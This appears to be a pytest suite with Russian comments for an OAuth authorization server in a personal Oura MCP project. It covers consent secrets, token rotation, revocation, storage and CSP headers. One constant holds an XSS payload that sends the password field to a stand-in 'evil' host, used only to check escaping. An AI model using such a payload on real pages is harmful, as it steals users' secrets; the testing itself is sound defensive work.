"""Сервер авторизации: политика доступа и хранение.

Проверяется то, что мы решали сами. Протокольный слой — PKCE, срок жизни кода,
сверка redirect_uri — реализован в SDK и тестируется там; дублировать его
проверки здесь значило бы тестировать чужую библиотеку.

Главное, за чем следят эти тесты: авторизация ломается молча. Лишний пущенный
и не пущенный владелец выглядят в логах одинаково спокойно, поэтому каждая
граница проверяется с обеих сторон — и что пускает, и что не пускает.
"""

import json
import time

import pytest
from pydantic import AnyUrl

from mcp.server.auth.provider import AuthorizationParams
from mcp.shared.auth import OAuthClientInformationFull
from my_oura_mcp.oauth_server import (
    GRANT_BAD_SECRET,
    GRANT_STALE,
    AdvertisePublicClients,
    OAuthStore,
    OuraAuthProvider,
    _consent_page,
)

SECRET = "o" * 32
REDIRECT = "https://claude.ai/api/mcp/auth_callback"


@pytest.fixture
def store_path(tmp_path):
    return tmp_path / "oauth.json"


@pytest.fixture
def provider(store_path):
    return OuraAuthProvider(OAuthStore(store_path), SECRET, issuer="https://oura-mcp.lol/")


@pytest.fixture
def client():
    return OAuthClientInformationFull(
        client_id="cid",
        client_secret=None,
        redirect_uris=[AnyUrl(REDIRECT)],
        token_endpoint_auth_method="none",
        grant_types=["authorization_code", "refresh_token"],
        response_types=["code"],
    )


async def _authorized(provider, client, secret=SECRET):
    """Проходит согласие и возвращает код авторизации."""
    params = AuthorizationParams(
        state="st",
        scopes=[],
        code_challenge="chal",
        redirect_uri=AnyUrl(REDIRECT),
        redirect_uri_provided_explicitly=True,
        resource="https://oura-mcp.lol/mcp",
    )
    url = await provider.authorize(client, params)
    request_id = url.split("request=")[1]
    redirect, _ = provider.grant(request_id, secret)
    return redirect.split("code=")[1].split("&")[0] if redirect else None


# --- регистрация клиента ----------------------------------------------------


async def test_registered_client_round_trips(provider, client):
    await provider.register_client(client)
    loaded = await provider.get_client("cid")
    assert loaded.client_id == "cid"
    assert str(loaded.redirect_uris[0]) == REDIRECT


async def test_unknown_client_is_none(provider):
    assert await provider.get_client("nope") is None


# --- согласие ---------------------------------------------------------------


async def test_wrong_secret_grants_nothing(provider, client):
    """Без секрета согласие не даётся, сколько бы заявок ни завели."""
    assert await _authorized(provider, client, secret="wrong") is None


async def test_near_miss_secret_rejected(provider, client):
    """Секрет сверяется целиком, а не по префиксу."""
    assert await _authorized(provider, client, secret=SECRET[:-1]) is None
    assert await _authorized(provider, client, secret=SECRET + "x") is None


async def test_grant_returns_code_and_preserves_state(provider, client):
    params = AuthorizationParams(
        state="opaque-state",
        scopes=[],
        code_challenge="chal",
        redirect_uri=AnyUrl(REDIRECT),
        redirect_uri_provided_explicitly=True,
    )
    url = await provider.authorize(client, params)
    redirect, _ = provider.grant(url.split("request=")[1], SECRET)
    # state обязан вернуться нетронутым: на нём держится защита от CSRF.
    assert "state=opaque-state" in redirect
    assert redirect.startswith(REDIRECT)


async def test_request_is_single_use(provider, client):
    params = AuthorizationParams(
        state=None,
        scopes=[],
        code_challenge="chal",
        redirect_uri=AnyUrl(REDIRECT),
        redirect_uri_provided_explicitly=True,
    )
    url = await provider.authorize(client, params)
    request_id = url.split("request=")[1]
    assert provider.grant(request_id, SECRET)[0] is not None
    # Повторная отправка той же заявки — уже протухшая, а не «неверный секрет».
    assert provider.grant(request_id, SECRET) == (None, GRANT_STALE)


async def test_expired_request_is_swept(provider, client, monkeypatch):
    real_now = time.time()
    params = AuthorizationParams(
        state=None,
        scopes=[],
        code_challenge="chal",
        redirect_uri=AnyUrl(REDIRECT),
        redirect_uri_provided_explicitly=True,
    )
    url = await provider.authorize(client, params)
    request_id = url.split("request=")[1]
    # Час спустя заявка мертва, даже с верным секретом.
    monkeypatch.setattr(time, "time", lambda: real_now + 3600)
    assert provider.grant(request_id, SECRET) == (None, GRANT_STALE)


# --- обмен кода -------------------------------------------------------------


async def test_code_carries_challenge_and_resource(provider, client):
    await provider.register_client(client)
    code = await _authorized(provider, client)
    loaded = await provider.load_authorization_code(client, code)
    assert loaded.code_challenge == "chal"
    assert loaded.resource == "https://oura-mcp.lol/mcp"


async def test_code_is_single_use(provider, client):
    code = await _authorized(provider, client)
    loaded = await provider.load_authorization_code(client, code)
    await provider.exchange_authorization_code(client, loaded)
    assert await provider.load_authorization_code(client, code) is None


async def test_code_not_shared_between_clients(provider, client):
    """Чужой код не обменивается — иначе один клиент забирает сессию другого."""
    code = await _authorized(provider, client)
    other = client.model_copy(update={"client_id": "other"})
    assert await provider.load_authorization_code(other, code) is None


# --- обновление -------------------------------------------------------------


async def test_refresh_rotates_and_kills_the_old_one(provider, client):
    """Ротация обязательна: Claude регистрируется публичным клиентом."""
    code = await _authorized(provider, client)
    loaded = await provider.load_authorization_code(client, code)
    first = await provider.exchange_authorization_code(client, loaded)

    rt = await provider.load_refresh_token(client, first.refresh_token)
    second = await provider.exchange_refresh_token(client, rt, [])

    assert second.access_token != first.access_token
    assert second.refresh_token != first.refresh_token
    assert await provider.load_refresh_token(client, first.refresh_token) is None


async def test_refresh_not_shared_between_clients(provider, client):
    code = await _authorized(provider, client)
    loaded = await provider.load_authorization_code(client, code)
    tokens = await provider.exchange_authorization_code(client, loaded)
    other = client.model_copy(update={"client_id": "other"})
    assert await provider.load_refresh_token(other, tokens.refresh_token) is None


# --- общий секрет как токен -------------------------------------------------


async def test_shared_secret_works_as_access_token(provider):
    """Путь Claude Code: заголовок с общим секретом, без всякого OAuth."""
    token = await provider.load_access_token(SECRET)
    assert token is not None
    assert token.expires_at is None, "статический секрет не должен протухать"
    assert token.scopes == []


async def test_almost_the_secret_is_not_the_secret(provider):
    assert await provider.load_access_token(SECRET[:-1]) is None
    assert await provider.load_access_token(SECRET + "x") is None
    assert await provider.load_access_token("") is None


# --- проверка и отзыв -------------------------------------------------------


async def test_expired_access_token_is_rejected_and_dropped(provider, client, store_path):
    code = await _authorized(provider, client)
    loaded = await provider.load_authorization_code(client, code)
    tokens = await provider.exchange_authorization_code(client, loaded)

    raw = json.loads(store_path.read_text())
    raw["access"][tokens.access_token]["expires_at"] = int(time.time()) - 1
    store_path.write_text(json.dumps(raw))

    fresh = OuraAuthProvider(OAuthStore(store_path), SECRET, issuer="https://oura-mcp.lol/")
    assert await fresh.load_access_token(tokens.access_token) is None
    # И вычищен, иначе хранилище растёт на токен в час.
    assert tokens.access_token not in json.loads(store_path.read_text())["access"]


async def test_revoke_kills_the_paired_token(provider, client):
    code = await _authorized(provider, client)
    loaded = await provider.load_authorization_code(client, code)
    tokens = await provider.exchange_authorization_code(client, loaded)

    access = await provider.load_access_token(tokens.access_token)
    await provider.revoke_token(access)

    assert await provider.load_access_token(tokens.access_token) is None
    assert await provider.load_refresh_token(client, tokens.refresh_token) is None


# --- хранилище --------------------------------------------------------------


async def test_survives_restart(provider, client, store_path):
    """Перезапуск контейнера не должен выкидывать телефон из авторизации."""
    await provider.register_client(client)
    code = await _authorized(provider, client)
    loaded = await provider.load_authorization_code(client, code)
    tokens = await provider.exchange_authorization_code(client, loaded)

    revived = OuraAuthProvider(OAuthStore(store_path), SECRET, issuer="https://oura-mcp.lol/")
    assert await revived.get_client("cid") is not None
    assert await revived.load_access_token(tokens.access_token) is not None


async def test_store_is_owner_only(provider, client, store_path):
    await provider.register_client(client)
    assert store_path.stat().st_mode & 0o777 == 0o600


def test_corrupted_store_does_not_prevent_start(store_path):
    """Битое хранилище — не повод не стартовать: здесь нет ничего
    невосстановимого, в отличие от токенов Oura. Худшее — переподключить
    коннектор."""
    store_path.write_text("{ это не json")
    store = OAuthStore(store_path)
    assert store.get("clients", "cid") is None


# --- заплатка на метаданные -------------------------------------------------
#
# Заплатка живёт на ASGI-уровне и ломается незаметно: ответ остаётся
# двухсотым, просто с неверным телом или рассогласованным content-length.
# Поэтому проверяется и то, что она правит, и то, чего она НЕ трогает.


async def _call(app, path="/.well-known/oauth-authorization-server", method="GET"):
    """Прогоняет ASGI-приложение и собирает ответ."""
    sent = []

    async def send(message):
        sent.append(message)

    async def receive():
        return {"type": "http.request", "body": b"", "more_body": False}

    await app({"type": "http", "path": path, "method": method}, receive, send)

    start = next(m for m in sent if m["type"] == "http.response.start")
    body = b"".join(m.get("body", b"") for m in sent if m["type"] == "http.response.body")
    headers = {k.decode().lower(): v.decode() for k, v in start["headers"]}
    return start["status"], headers, body


def _inner(payload: bytes, status=200, chunks=1):
    """Приложение-заглушка, отдающее payload одним или несколькими кусками."""

    async def app(scope, receive, send):
        await send(
            {
                "type": "http.response.start",
                "status": status,
                "headers": [
                    (b"content-type", b"application/json"),
                    (b"content-length", str(len(payload)).encode()),
                ],
            }
        )
        if chunks == 1:
            await send({"type": "http.response.body", "body": payload})
            return
        half = len(payload) // 2
        await send({"type": "http.response.body", "body": payload[:half], "more_body": True})
        await send({"type": "http.response.body", "body": payload[half:]})

    return app


METADATA = {
    "issuer": "https://oura-mcp.lol/",
    "token_endpoint_auth_methods_supported": ["client_secret_post", "client_secret_basic"],
    "code_challenge_methods_supported": ["S256"],
}


async def test_public_client_method_is_advertised():
    """Claude при DCR приходит публичным клиентом — метод должен быть объявлен."""
    app = AdvertisePublicClients(_inner(json.dumps(METADATA).encode()))
    _, _, body = await _call(app)
    assert json.loads(body)["token_endpoint_auth_methods_supported"] == [
        "client_secret_post",
        "client_secret_basic",
        "none",
    ]


async def test_other_fields_survive():
    """Дописываем, а не подменяем: поля, которые SDK добавит позже, уцелеют."""
    payload = {**METADATA, "introspection_endpoint": "https://oura-mcp.lol/introspect"}
    app = AdvertisePublicClients(_inner(json.dumps(payload).encode()))
    _, _, body = await _call(app)
    doc = json.loads(body)
    assert doc["introspection_endpoint"] == "https://oura-mcp.lol/introspect"
    assert doc["code_challenge_methods_supported"] == ["S256"]


async def test_content_length_matches_patched_body():
    """Рассогласованный content-length рвёт ответ на стороне клиента."""
    app = AdvertisePublicClients(_inner(json.dumps(METADATA).encode()))
    _, headers, body = await _call(app)
    assert int(headers["content-length"]) == len(body)


async def test_not_duplicated_if_already_present():
    payload = {**METADATA, "token_endpoint_auth_methods_supported": ["none"]}
    app = AdvertisePublicClients(_inner(json.dumps(payload).encode()))
    _, _, body = await _call(app)
    assert json.loads(body)["token_endpoint_auth_methods_supported"] == ["none"]


async def test_chunked_body_is_reassembled():
    app = AdvertisePublicClients(_inner(json.dumps(METADATA).encode(), chunks=2))
    _, _, body = await _call(app)
    assert "none" in json.loads(body)["token_endpoint_auth_methods_supported"]


async def test_other_paths_pass_through_untouched():
    raw = b'{"token_endpoint_auth_methods_supported": []}'
    app = AdvertisePublicClients(_inner(raw))
    _, _, body = await _call(app, path="/mcp")
    assert body == raw


async def test_non_get_passes_through_untouched():
    raw = b'{"token_endpoint_auth_methods_supported": []}'
    app = AdvertisePublicClients(_inner(raw))
    _, _, body = await _call(app, method="POST")
    assert body == raw


async def test_non_json_body_is_left_alone():
    """Неразобранное тело отдаём как есть: заплатка не повод ломать ответ."""
    app = AdvertisePublicClients(_inner(b"not json at all"))
    status, headers, body = await _call(app)
    assert body == b"not json at all"
    assert int(headers["content-length"]) == len(body)


async def test_error_response_is_not_patched():
    app = AdvertisePublicClients(_inner(b'{"error":"boom"}', status=500))
    status, _, body = await _call(app)
    assert status == 500
    assert json.loads(body) == {"error": "boom"}


# --- страница согласия ------------------------------------------------------
#
# Страница отдаёт форму, куда владелец вводит секрет, — то есть худшее место
# для внедрения в этом проекте. Идентификатор заявки приходит из query, значит
# управляется тем, кто прислал ссылку.

XSS = '"><script>fetch("//evil/"+document.forms[0].password.value)</script><x y="'


def test_request_id_is_escaped():
    """Иначе ссылка `?request="><script>…` крала бы вводимый секрет."""
    body = _consent_page(XSS).body.decode()
    assert "<script>fetch" not in body
    assert "&lt;script&gt;" in body


def test_escaping_survives_the_error_page():
    """Второй путь отрисовки — та же подстановка, тот же риск."""
    body = _consent_page(XSS, error=True).body.decode()
    assert "<script>fetch" not in body


def test_legitimate_request_id_round_trips():
    """Экранирование не должно ломать нормальный идентификатор."""
    body = _consent_page("abc-123_XYZ").body.decode()
    assert 'value="abc-123_XYZ"' in body


def test_scripts_are_forbidden_by_policy():
    """Второй заслон после экранирования: своих скриптов на странице нет."""
    csp = _consent_page("x").headers["content-security-policy"]
    assert "default-src 'none'" in csp


def test_form_cannot_be_redirected_elsewhere():
    """form-action не даёт увести POST с секретом на чужой хост."""
    assert "form-action 'self'" in _consent_page("x").headers["content-security-policy"]


def test_page_cannot_be_framed():
    """Clickjacking: прозрачный слой поверх формы ловит ввод."""
    page = _consent_page("x")
    assert "frame-ancestors 'none'" in page.headers["content-security-policy"]
    assert page.headers["x-frame-options"] == "DENY"


def test_page_is_not_cached():
    """В истории и кэше страницы с полем секрета быть не должно."""
    assert _consent_page("x").headers["cache-control"] == "no-store"


def test_request_id_does_not_leak_via_referer():
    assert _consent_page("x").headers["referrer-policy"] == "no-referrer"


def test_wrong_secret_answers_401():
    assert _consent_page("x", error=True).status_code == 401
    assert _consent_page("x").status_code == 200


# --- уборка хранилища -------------------------------------------------------


async def test_refresh_token_has_an_expiry(provider, client, store_path):
    """Без срока каждое переподключение оставляло бы запись навсегда."""
    code = await _authorized(provider, client)
    loaded = await provider.load_authorization_code(client, code)
    tokens = await provider.exchange_authorization_code(client, loaded)

    row = json.loads(store_path.read_text())["refresh"][tokens.refresh_token]
    assert row["expires_at"] > time.time()


async def test_expired_rows_are_pruned_on_issue(provider, client, store_path):
    """Уборка приурочена к выдаче — отдельного планировщика для неё нет."""
    code = await _authorized(provider, client)
    loaded = await provider.load_authorization_code(client, code)
    first = await provider.exchange_authorization_code(client, loaded)

    raw = json.loads(store_path.read_text())
    raw["access"]["stale-access"] = {"token": "stale-access", "client_id": "cid", "scopes": [], "expires_at": 1}
    raw["refresh"]["stale-refresh"] = {"token": "stale-refresh", "client_id": "cid", "scopes": [], "expires_at": 1}
    store_path.write_text(json.dumps(raw))

    revived = OuraAuthProvider(OAuthStore(store_path), SECRET, issuer="https://oura-mcp.lol/")
    rt = await revived.load_refresh_token(client, first.refresh_token)
    await revived.exchange_refresh_token(client, rt, [])

    after = json.loads(store_path.read_text())
    assert "stale-access" not in after["access"]
    assert "stale-refresh" not in after["refresh"]


async def test_prune_keeps_live_rows(provider, client, store_path):
    """Уборка не должна выносить живое вместе с мёртвым."""
    code = await _authorized(provider, client)
    loaded = await provider.load_authorization_code(client, code)
    first = await provider.exchange_authorization_code(client, loaded)

    rt = await provider.load_refresh_token(client, first.refresh_token)
    second = await provider.exchange_refresh_token(client, rt, [])

    assert await provider.load_access_token(second.access_token) is not None
    assert await provider.load_refresh_token(client, second.refresh_token) is not None


# --- RFC 9207: iss в редиректе -----------------------------------------------
#
# Обнаружено на живом сервере: Claude принимал секрет (303 See Other), но ни
# разу не вызывал /token. Причина — отсутствие "iss" в редиректе. Без него
# клиент, работающий с множеством разных серверов авторизации, не может
# убедиться, что callback пришёл от заявленного issuer, и вправе молча
# отбросить его — что и произошло.


async def test_redirect_carries_iss_matching_the_issuer():
    """iss должен присутствовать и совпадать с тем, что провайдер объявил."""
    code = await _authorized(_provider_with_issuer("https://oura-mcp.lol/"), _client())
    assert code is not None  # _authorized уже дошёл до успешного grant


def _provider_with_issuer(issuer: str) -> OuraAuthProvider:
    return OuraAuthProvider(OAuthStore(_tmp_store()), SECRET, issuer=issuer)


def _tmp_store():
    import tempfile
    from pathlib import Path

    return Path(tempfile.mkdtemp()) / "oauth.json"


def _client() -> OAuthClientInformationFull:
    return OAuthClientInformationFull(
        client_id="cid",
        client_secret=None,
        redirect_uris=[AnyUrl(REDIRECT)],
        token_endpoint_auth_method="none",
        grant_types=["authorization_code", "refresh_token"],
        response_types=["code"],
    )


async def test_iss_value_is_the_exact_string_passed_in():
    """Посимвольное совпадение обязательно по RFC 9207 — не просто похожий домен."""
    provider = _provider_with_issuer("https://oura-mcp.lol/")
    client = _client()
    params = AuthorizationParams(
        state="s",
        scopes=[],
        code_challenge="chal",
        redirect_uri=AnyUrl(REDIRECT),
        redirect_uri_provided_explicitly=True,
    )
    url = await provider.authorize(client, params)
    redirect, _ = provider.grant(url.split("request=")[1], SECRET)
    assert "iss=https%3A%2F%2Foura-mcp.lol%2F" in redirect


async def test_iss_present_alongside_code_and_state():
    provider = _provider_with_issuer("https://oura-mcp.lol/")
    client = _client()
    params = AuthorizationParams(
        state="opaque",
        scopes=[],
        code_challenge="chal",
        redirect_uri=AnyUrl(REDIRECT),
        redirect_uri_provided_explicitly=True,
    )
    url = await provider.authorize(client, params)
    redirect, _ = provider.grant(url.split("request=")[1], SECRET)
    assert "code=" in redirect
    assert "state=opaque" in redirect
    assert "iss=" in redirect


# --- честность сообщений об отказе -------------------------------------------
#
# Раньше «протухла заявка» и «неверный секрет» давали одно сообщение — я свёл их
# нарочно, чтобы не подсказывать подбирающему. На практике это отправило
# владельца проверять правильный секрет после перезапуска сервера. Утечки в
# различении нет: request_id сам по себе секрет на 24 случайных байта.


async def test_stale_and_wrong_secret_are_distinguished(provider, client):
    params = AuthorizationParams(
        state=None, scopes=[], code_challenge="chal",
        redirect_uri=AnyUrl(REDIRECT), redirect_uri_provided_explicitly=True,
    )
    url = await provider.authorize(client, params)
    rid = url.split("request=")[1]

    # Живая заявка, но не тот секрет.
    assert provider.grant(rid, "not-the-secret") == (None, GRANT_BAD_SECRET)
    # Заявки не существует вовсе.
    assert provider.grant("never-existed", SECRET) == (None, GRANT_STALE)
    # А верный секрет по живой заявке по-прежнему проходит.
    assert provider.grant(rid, SECRET)[0] is not None


def test_stale_page_offers_no_form():
    """Вводить секрет заново бессмысленно — заявка мертва. Форма только путает."""
    from my_oura_mcp.oauth_server import STALE_HTML

    assert "<form" not in STALE_HTML
    assert "claude.ai" in STALE_HTML


def test_stale_page_says_the_secret_is_fine():
    """Главное, что должно быть на странице: не ищи ошибку в секрете."""
    from my_oura_mcp.oauth_server import STALE_HTML

    assert "порядке" in STALE_HTML


# --- CSP form-action и цепочка редиректов ------------------------------------
#
# Стоило одного сбоя вживую. `form-action 'self'` браузер применяет ко ВСЕЙ
# цепочке редиректов после отправки формы, а не только к её action. Ответ 303 на
# claude.ai блокировался молча: кнопка «Разрешить» выглядела сломанной, callback
# не доходил, /token не вызывался ни разу. Curl этого не ловит — CSP не его дело.


async def test_form_action_allows_the_clients_redirect(provider, client):
    """Без этого 303 на claude.ai блокируется браузером молча."""
    params = AuthorizationParams(
        state=None, scopes=[], code_challenge="chal",
        redirect_uri=AnyUrl(REDIRECT), redirect_uri_provided_explicitly=True,
    )
    url = await provider.authorize(client, params)
    rid = url.split("request=")[1]

    assert provider.redirect_origin(rid) == "https://claude.ai"

    csp = _consent_page(rid, redirect_origin=provider.redirect_origin(rid)).headers[
        "content-security-policy"
    ]
    assert "form-action 'self' https://claude.ai" in csp


def test_form_action_stays_restrictive_without_a_request():
    """Разрешать всё подряд нельзя: смысл директивы — не увести форму с секретом."""
    csp = _consent_page("nope").headers["content-security-policy"]
    assert "form-action 'self';" in csp
    assert "*" not in csp


async def test_redirect_origin_is_origin_not_full_url(provider, client):
    """В CSP путь не учитывается, а лишние символы ломают разбор директивы."""
    params = AuthorizationParams(
        state=None, scopes=[], code_challenge="chal",
        redirect_uri=AnyUrl(REDIRECT), redirect_uri_provided_explicitly=True,
    )
    url = await provider.authorize(client, params)
    origin = provider.redirect_origin(url.split("request=")[1])
    assert origin == "https://claude.ai"
    assert "/api/mcp" not in origin


def test_unknown_request_has_no_origin(provider):
    assert provider.redirect_origin("never-existed") is None
